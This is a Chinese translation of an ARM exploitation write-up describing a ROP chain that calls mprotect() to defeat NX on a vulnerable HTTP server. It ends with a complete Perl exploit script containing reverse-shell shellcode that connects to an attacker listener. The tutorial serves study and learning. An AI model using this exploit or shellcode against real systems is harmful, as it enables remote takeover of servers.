<html>
<head>
<title>ARM Exploitation — Defeating NX By Invoking mprotect() Using ROP</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ARM利用—通过使用ROP调用mprotect()来击败NX</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/arm-exploitation-defeating-nx-by-invoking-mprotect-using-rop-1450b6667c16?source=collection_archive---------1-----------------------#2021-01-25">https://infosecwriteups.com/arm-exploitation-defeating-nx-by-invoking-mprotect-using-rop-1450b6667c16?source=collection_archive---------1-----------------------#2021-01-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b0c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这篇文章中，我将详细介绍如何利用return-to-libc攻击来利用带有不可执行堆栈的易受攻击的HTTP web服务器。此外，该漏洞利用将利用面向返回的编程(ROP)技术来链接libc中的小工具，以便(1)调用mprotect()来修改堆栈权限以允许读/写/执行，以及(2)从堆栈中执行我们的外壳代码。</p><h1 id="1a85" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">什么是返回到libc？</h1><p id="6db0" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">如果您以前做过缓冲区溢出练习，您应该知道这种技术是用过多的字符使程序溢出，这样您的有效负载就会使程序计数器和堆栈中的内容溢出。目标是修改程序计数器以跳转到执行攻击者外壳代码的堆栈地址。但是，如果程序的堆栈权限设置为非执行，这个概念就行不通了。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/daf09fa88c193da0aeb75e0f4186199e.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*JADBfSxiflZ1ibx1smaNqg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图1 — Stack是不可执行的，而libc是可执行的。</figcaption></figure><p id="17cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了克服这个问题，我们可以利用C标准库(“libc”)来直接执行预先存在的功能(例如system、mprotect等)。).</p><h1 id="7258" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ROP是什么？</h1><p id="d202" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">引用维基百科的话，ROP是一种技术，攻击者获得调用堆栈的控制权，以劫持程序控制流，然后执行精心选择的已经存在于机器内存中的机器指令序列，称为“小工具”。每个小工具通常以返回指令结束，并位于现有程序和/或共享库代码内的子例程中。这些小工具连接在一起，使得攻击者能够在终端上执行任意操作。</p><p id="4dba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我经常引用的一个非常好的比喻是报纸。想象一下，libc是一份包含大量代码的报纸。不直接从栈中执行有效载荷，同样可以通过从libc中执行代码来实现。我们可以从不同的页面提取(链接)这些代码(小工具)来执行我们的执行。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/f8b12cc4214dc89b9c215e8662b458af.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*1l2SL03-ppqS7I_03Xk-cA.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图2——来自libc的链接小工具的报纸类比</figcaption></figure><p id="ea70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我真正喜欢ROP的是，有多种方法可以实现相同的最终目标。它迫使我跳出框框思考，把不同的小玩意拼凑在一起。这个概念就像一个七巧板，有许多不同的形状和大小。目标是利用特定的块来很好地适应方形边界，这可能有许多不同的可能性。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/7ac0f22aba71219ffb3b3ea8af0077f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*O0DYaMA2amg1Bgn5Kso6ZQ.jpeg"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图3: <a class="ae mc" href="https://rukminim1.flixcart.com/image/352/352/jnnhua80/block-construction/3/v/k/rainbow-color-wooden-tangram-kids-7-piece-jigsaw-puzzle-building-original-imafaah2gyydzf2f.jpeg?q=70" rel="noopener ugc nofollow" target="_blank">七巧板类比</a></figcaption></figure><h1 id="1d64" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">易受攻击的HTTP web服务器</h1><p id="2032" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">像所有其他缓冲区溢出练习一样，第一步是确定程序计数器的偏移量($PC)和堆栈指针内容的偏移量($SP)。在Kali中，我们可以调用' pattern_create.rb '脚本来生成一个唯一的模式字符串，我们稍后可以用它来标识这些寄存器的偏移量。</p><pre class="lp lq lr ls gt md me mf mg aw mh bi"><span id="134c" class="mi km iq me b gy mj mk l ml mm">GET /Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A HTTP/1.0</span></pre><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/2d74664680cb8630445b2db08c2eae81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*e_EsXTlGE1NIpvFrZ7SlOg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图4:程序崩溃时的状态。</figcaption></figure><p id="8c48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当程序崩溃时，我们可以通过提取$PC中存储的值和$SP中的内容来确定偏移量。</p><p id="053d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">需要注意的是，在ARM架构中，程序可以从ARM (4字节)转换为Thumb (2字节)，反之亦然。它的$PC计数器最低有效位将始终是一个偶数(0)。假设我们正在执行一个典型的缓冲区溢出，大量的“A”被转换为0x41，$PC将被反映为0x41414140 (THUMB标志设置为0x1)，而不是0x41414141。因此，在这种情况下，请注意THUMB标志被设置，因此，当使用Kali中的“pattern_offset.rb”工具时，我们必须向$PC添加1。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/94212de308fafe8aee11fca2d8e9cbe5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*iSGHXbl9iBOaYkQLjJ4bUg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图5:在kali中使用‘pattern _ offset . Rb’分别确定$PC和$SP的偏移量。</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/ecff098a76fb68827dbc357ff8363794.png" data-original-src="https://miro.medium.com/v2/resize:fit:934/format:webp/1*-YwwH_NBasTyv4p8-cL73w.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图6:控制$PC和$SP中内容的状态</figcaption></figure><p id="acba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了验证发现的结果，我修改了漏洞脚本，如下所示:</p><pre class="lp lq lr ls gt md me mf mg aw mh bi"><span id="5986" class="mi km iq me b gy mj mk l ml mm">#!/usr/bin/perl<br/>$| = 1;</span><span id="c4d9" class="mi km iq me b gy mp mk l ml mm">$buf = “A” x 347;<br/>$buf .= “B” x 4;<br/>$buf .= “A” x 16;<br/>$buf .= “D” x 50;<br/>$uri = $buf;</span><span id="683c" class="mi km iq me b gy mp mk l ml mm"># URL Encode<br/>$uri =~ s/([^A-Za-z0–9\/])/sprintf(“%%%02X”, ord($1))/seg;<br/>$request = “GET /${uri} HTTP/1.0\n\n”;<br/>print $request;</span></pre><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/b7bc4118cc826d549295b9642c7a9ea6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*lx-ybxmcE2sNT6XOFgZu4w.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图7:控制$PC和$SP的内容。</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/daf09fa88c193da0aeb75e0f4186199e.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*JADBfSxiflZ1ibx1smaNqg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图8:堆栈是不可执行的。</figcaption></figure><p id="0fa6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，我已经成功地覆盖了$PC和$SP中的内容。但是，我仍然无法执行堆栈中的外壳代码。下一步是调用libc中的mprotect()来修改堆栈权限。</p><h1 id="a9b3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">mprotect()是什么？</h1><p id="03b3" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">如Linux手册页中所述，mprotect是一个修改内存区域权限的函数。它接受三个参数:</p><ul class=""><li id="b638" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">内存区域的起始地址。</li><li id="7eed" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">区域的长度。简而言之，结束地址应该在哪里？</li><li id="eea4" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">权限设置<br/>(PROT _读取— 0x1，PROT _写入— 0x2，PROT _执行— 0x4，PROT _无— 0x0)</li></ul><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/833cef4113f52a4c416ce11599edaa1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*Kj-9kYgIUty2rbDIQuZ8sg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图mprotect()手册页</figcaption></figure><p id="5fa5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有了关于mprotect的信息，<strong class="jp ir">的最终目标</strong>是确保在调用mprotect调用之前，用以下值设置以下寄存器。</p><ul class=""><li id="5421" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">r0 = 0x befb 000<em class="ne">(参考图7，$SP地址从0xbeffb3a8开始递增。因此，从这个地址出发是安全的)</em></li><li id="a64d" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">R1 = 0x01010101 <em class="ne">(足够大的长度以容纳堆栈中的有效载荷，代码中没有空字节)</em></li><li id="a93b" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">R2 = 0x 00000007<em class="ne">(允许读取、写入和执行)</em></li></ul><h1 id="3c19" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">从libc查找相关小工具来设置R0、R1和R2</h1><p id="697e" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">有趣的部分来了，从“报纸”上找到小工具来设置注册表的值。我对提取的libc文件“/lib/arm-Linux-gnueabihf/libc-2.13 . so”使用了工具“Ropper”。在手臂和拇指状态中搜索可能的小工具是很重要的。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nf"><img src="../Images/fb1e19397508e2c7116a78044e264fa4.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/1*7YUSM08WMJ-mfu-0FTfX-Q.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图10:ARM模式下的Ropper</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nk"><img src="../Images/c268bfe96ad736389eee7d79b3836e39.png" data-original-src="https://miro.medium.com/v2/resize:fit:826/format:webp/1*VG7wa24ji8Jw-eQmVFajEg.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图11:arm thumb模式下的Ropper</figcaption></figure><p id="6580" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是使用搜索功能时的一些有用提示。</p><pre class="lp lq lr ls gt md me mf mg aw mh bi"><span id="4b8a" class="mi km iq me b gy mj mk l ml mm">(libc-2.13.so/ELF/ARMTHUMB)&gt; help search<br/>search [/&lt;quality&gt;/] &lt;string&gt; — search gadgets.</span><span id="82d6" class="mi km iq me b gy mp mk l ml mm">/quality/ The quality of the gadget (1 = best). The better the quality the less instructions are between the found instruction and ret</span><span id="5e67" class="mi km iq me b gy mp mk l ml mm">? any character</span><span id="13f5" class="mi km iq me b gy mp mk l ml mm">% any string</span></pre><h1 id="d1b7" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">设置R1 = 0x01010101的小工具</h1><p id="bc57" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我已经决定开始寻找R1和R2的小工具，因为它比R0更简单。在整个利用脚本中，我们必须确保有效载荷中不存在空字节(即0x00)，否则利用将不会成功。</p><p id="4521" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我可以控制堆栈的内容，所以最简单的方法是寻找一个弹出指令，允许我将堆栈的下一个值放入R1。通过简单的搜索，我找到了一个“pop {r1，pc}”的小工具。我可以简单地将0x01010101的值放入R1，并控制下一个返回地址放入程序计数器。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nl"><img src="../Images/6511d22ead069284533503deb3c7ec40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zyl7DQVkI8SpyagZUnDVDA.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图12:libc中的指令将堆栈中的值弹出到r1，并将堆栈中的下一个值弹出到程序计数器。</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/e2438710a391f43496094f012412a1a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:624/format:webp/1*FrY3Qm-HkRd3KOOsXwD-hg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图13:为R1绘制漏洞脚本。</figcaption></figure><h1 id="b964" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">设置R2 = 0x0000007的小工具</h1><p id="8e65" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">对于R2，由于我无法将空字节放入堆栈(0x <strong class="jp ir"> 000000 </strong> 07)，我不得不寻找将立即值7“移动”到任何寄存器中的小工具。进行搜索时，我发现了一个小工具，它将立即值7移动到R0，并将堆栈的值弹出到R4、R5、R6和PC。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nn"><img src="../Images/395d6dcbf0d0866824ec3083b8b47498.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r0FA1p56hWMb-y-CXkA1bw.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图14:将立即值7移动到R0。</figcaption></figure><p id="0a2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了！现在，我必须找到一个小工具，移动R0值到R2。在“mov r2，r0”上进行搜索没有结果。然而，如果我们尝试使用' movs r2，r0 '，会返回大量结果。</p><p id="83ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">*MOVS指令执行与MOV指令相同的操作，但也更新N和Z标志。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi no"><img src="../Images/a5f19d5dfacdecd7074c6927b4fceb7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eCylTynw5cVpx-Gdp_3XBA.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图15:将R0的值移动到R2</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi np"><img src="../Images/dbff66c13e79ce78185798a5208499a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*0Z27A7zs6h0rtseAfBZ_Gw.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图16:为R2绘制漏洞脚本。</figcaption></figure><h1 id="001f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">设置R0 = 0xbeffb000的小工具</h1><p id="df2c" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">设置R0稍微复杂一些。对于这么大的地址值，我不得不使用算术运算(AND、ADD、SUB、EOR等)。)并同时确保不存在空字节。因此，我必须想出可能的方法来达到预期的结果。</p><p id="7df5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图搜索“and”操作，注意到一条指令接受R0和R3，并将值存储到R0中。随后，它分支进入链接寄存器。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nq"><img src="../Images/998fce1df5decc11ff1bf08a0fab6e55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wnmk1lKzgQgM2RERh-wnZw.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图17:针对R0和R3的AND指令</figcaption></figure><p id="6ee2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在脑子里，我做了一些计算，如果R0 = 0xbeffb010，R3 = 0xfffff001，那就会得到0xbeffb000。首先，我需要找到一个小工具，允许我直接将这些值放入R0和R3。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nn"><img src="../Images/754b6e47a833d4f12c11c4909e438922.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X8vARHaK0M2WV5yAYkmcpQ.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图18:将我们定义的值放入R0和R3的弹出指令</figcaption></figure><p id="0027" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其次，我必须处理链接寄存器(LR)中的值。我试图寻找一个可以用我的召唤值覆盖LR的小工具。做一个简单的搜索，我发现一个pop {lr}指令，它随后分支到lr。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi gj"><img src="../Images/1a59512678ca484d74873c4d51c5dfca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ozySMgnobYb15sO9plJ5lQ.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图19:覆盖LR寄存器的弹出指令</figcaption></figure><p id="8890" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最简单的方法是在LR地址中定义一条pop {PC}指令，如图18所示，如果一条指令分支到LR，它会将堆栈中的下一项弹出到PC。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/8e0ce000a4bda60d817cf75b59fd253d.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*XSuDDFSJ8oszO0LLAD2-8w.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图20:映射R0的漏洞脚本。</figcaption></figure><h1 id="ccd0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">调用mprotect并在堆栈中执行shell代码</h1><p id="0682" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">设置三个寄存器值后的下一步是调用libc中的mprotect函数。类似地，我们可以通过在GDB使用print命令来确定mprotect的偏移量。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/56c11d908bd240d7ef6a7b43e6c292d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1020/format:webp/1*-Iy1iERNOyPaUCvx0yKrlg.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图21:使用GDB识别mprotect的偏移</figcaption></figure><p id="3d34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">修改堆栈权限的权限后的最后一步是跳转到堆栈指针，执行攻击者的外壳代码。通过利用LR = pop {PC}，一旦mprotect返回到调用者函数，它就会将堆栈中最新的指令弹出到PC。因此，我们可以将BX SP直接设置在mprotect之后，它将执行shell代码。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/771e69956111859cf8c9a5f985e9e287.png" data-original-src="https://miro.medium.com/v2/resize:fit:694/format:webp/1*6WJnNrNhaXSQw3e6MkepvQ.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图22:搜索BX SP指令</figcaption></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/c5b19627e92bc8fbd0b271cbecf93ecb.png" data-original-src="https://miro.medium.com/v2/resize:fit:564/format:webp/1*DQO3Vqtfu0VxGLiXs4OyoQ.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图23:映射漏洞脚本的最后部分。</figcaption></figure><h1 id="a6be" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">将碎片拼在一起</h1><p id="4697" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">现在我们已经确定了我们所有的小工具，是时候把这些碎片放在一起了。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nu"><img src="../Images/9f2427c92cfff0440b41a26272f3b724.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NjX5IMA7lB_BgjasKHIWfQ.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图24:最终的漏洞脚本</figcaption></figure><p id="c797" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为调试的一部分，我在mprotect调用之前放置了垃圾地址来使程序崩溃，以观察存储在R0、R1和R2中的值。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/4723f1dfa14b98d9d349c080ef7a3e50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*aPBzK7pYh6qN0bQ0bEnp7g.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图25:调用mprotect之前的状态</figcaption></figure><p id="cd4f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">类似地，在mprotect调用之后，我放置了一个垃圾地址来使程序崩溃，以观察堆栈权限是否按照预期更改为读/写/执行。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nv"><img src="../Images/92f10d2b96bc336a710f52715f76c726.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MgWgF-EwJ7NXH8NbZXsY8g.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图26:调用mprotect后的状态</figcaption></figure><p id="0e2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的shell代码中，我放置了一个反向shell有效负载。通过在攻击者的机器上设置一个监听器，我从受害者的端点获得了一个交互式shell！</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/768332e1253e6c8025fd6ee103946889.png" data-original-src="https://miro.medium.com/v2/resize:fit:924/format:webp/1*xw3pl_k3uhMY3E5ExmoRdw.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">图27:shell代码的成功执行</figcaption></figure><pre class="lp lq lr ls gt md me mf mg aw mh bi"><span id="1185" class="mi km iq me b gy mj mk l ml mm">#!/usr/bin/perl</span><span id="8190" class="mi km iq me b gy mp mk l ml mm">$| = 1;</span><span id="bf88" class="mi km iq me b gy mp mk l ml mm">$libc = 0xb6e9c000;                     # libc base<br/>$shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x92\x1a\x49\x1a\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\xc8\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58";<br/>$buf = "A" x 347;<br/>$buf .= pack("V", $libc + 0x1019d4); #pop {r1, pc}<br/>$buf .= "C" x 16;<br/>$buf .= pack("V", 0x01010101); # set r1<br/>$buf .= pack("V", $libc + 0xd68ec); #mov r0, #7; pop {r4,r5,r6,pc}<br/>$buf .= "A" x 4; # r4<br/>$buf .= "B" x 4; # r5<br/>$buf .= "D" x 4; # r6<br/>$buf .= pack("V", $libc + 0xfe087); #mov r2, r0; pop {r4, pc}<br/>$buf .= "A" x 4; <br/>$buf .= pack("V", $libc + 0x75a69); #pop {r0, r3, pc}<br/>$buf .= pack("V", 0xbeffb010); #r0<br/>$buf .= pack("V", 0xfffff001); #r3<br/>$buf .= pack("V", $libc + 0x3c420); #pop {lr}; add sp, sp, #4; bx lr;<br/>$buf .= pack("V", $libc + 0x8cec5); #pop {pc};<br/>$buf .= "A" x 4;<br/>$buf .= pack("V", $libc + 0x64934); #and r0, r3, r0; bx lr;<br/>$buf .= pack("V", $libc + 0xc70f0); #mprotect()<br/>$buf .= pack("V", $libc + 0x5531); #bx sp;<br/>$buf .= $shellcode;<br/>$uri = $buf;</span><span id="1ee4" class="mi km iq me b gy mp mk l ml mm"># URL Encode<br/>$uri =~ s/([^A-Za-z0-9\/])/sprintf("%%%02X", ord($1))/seg;</span><span id="16c8" class="mi km iq me b gy mp mk l ml mm">$request = "GET /${uri} HTTP/1.0\n\n";<br/>print $request;</span></pre><p id="3f36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总而言之，我分享的只是通过调用mprotect()函数绕过NX堆栈的众多方法之一。我真的很喜欢ROP技术，因为它真的需要我提前计划，并思考不同的小工具如何一起工作。最令人满意的部分是整个利用的完成，其中外壳代码被成功地执行以达到最终期望的结果。</p></div></div>    
</body>
</html>